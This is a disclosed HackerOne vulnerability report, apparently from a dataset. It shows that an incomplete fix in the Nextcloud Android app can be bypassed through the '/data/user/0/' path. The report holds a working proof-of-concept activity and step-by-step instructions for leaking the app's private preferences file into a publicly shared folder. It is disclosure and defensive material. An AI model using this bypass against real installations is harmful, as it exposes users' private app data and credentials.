---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1408692'
original_report_id: '1408692'
title: Access to arbitrary file of the Nextcloud Android app from within the Nextcloud
  Android app
weakness: Path Traversal
team_handle: nextcloud
created_at: '2021-11-23T23:44:09.408Z'
disclosed_at: '2022-09-11T11:41:13.634Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 11
asset_identifier: com.nextcloud.client
asset_type: GOOGLE_PLAY_APP_ID
max_severity: medium
tags:
- hackerone
- path-traversal
---

# Access to arbitrary file of the Nextcloud Android app from within the Nextcloud Android app

## Metadata

- HackerOne Report ID: 1408692
- Weakness: Path Traversal
- Program: nextcloud
- Disclosed At: 2022-09-11T11:41:13.634Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
The Android client of nextcloud (com.nextcloud.client) allows arbitrary file including protected/private files to be leaked through the file upload functionality.

## Steps To Reproduce:
A report [1142918 ](https://hackerone.com/reports/1142918) has been submitted for the vulnerability of leaking arbitrary protected files. NextCloud added [a fix](https://github.com/nextcloud/android/pull/8433/commits/97d6f2954c879f3bfebcd241993147bced5fd50b) on May 18, 2021, which added a check to the class src/main/java/com/owncloud/android/files/services/FileUploader.java:
```
        if (file.getStoragePath().startsWith("/data/data/")) {
            Log_OC.d(TAG, "Upload from sensitive path is not allowed");
            return;
        }
```

The fix checks whether a file to be uploaded has a path starting with "/data/data". However, the check is not sufficient. We can easily bypass this check using the path "/data/user/0/" e.g. "/data/user/0/com.nextcloud.client/".  A program to exploit this vulnerability can be:
```
public class EvilActivity extends AppCompatActivity {
    private static final String LOG_TAG = EvilActivity.class.getName();

    final static String PRIVATE_URI = "file:///data/user/0/com.nextcloud.client/shared_prefs/com.nextcloud.client_preferences.xml";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("heen", "EvilActivity started!");
        setResult(-1, new Intent().setData(Uri.parse(PRIVATE_URI)));
        finish();
    }
}
```

A working POC is as follows:
### 1. install and login nextcloud android client e.g. through the provider https://us.cloudamo.com
### 2. create a directory and set it 'shareable'
### 3.install the POC app with the program above
### 4. Navigate to the shareable directory in the step2, click '+', then choose "upload content from other apps"
### 5. Select "poc" then protected file will be uploaded to the shared folder, which is publicly shared and leaked.

## Supporting Material/References:
A sample screenshot with protected files uploaded and their content is:
{F1523976}
{F1523979}

  * [attachment / reference]
See attachments above

## Impact

Arbitrary sensitive file of the nextcloud android client can be leaked. To address this issue, disallow any file whose path has the package name but isn't in the temp or cache folder of nextcloud. 

Please investigate. Thanks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
